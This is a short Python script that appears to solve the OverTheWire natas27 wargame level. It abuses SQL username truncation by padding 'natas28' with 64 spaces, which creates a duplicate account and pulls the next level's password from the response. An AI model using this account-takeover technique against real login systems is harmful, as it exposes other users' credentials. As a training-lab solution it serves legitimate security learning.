import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '27'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas27', passw.strip())
    space = " "
    payload = {'username':'natas28' + (space*64) + 'a','password':''}
    payload2 = {'username':'natas28' + (space*64), 'password':''}
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    requests.post('http://natas27.natas.labs.overthewire.org/', auth=auth, data=payload)
    r = requests.post('http://natas27.natas.labs.overthewire.org/', auth=auth, data=payload2)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
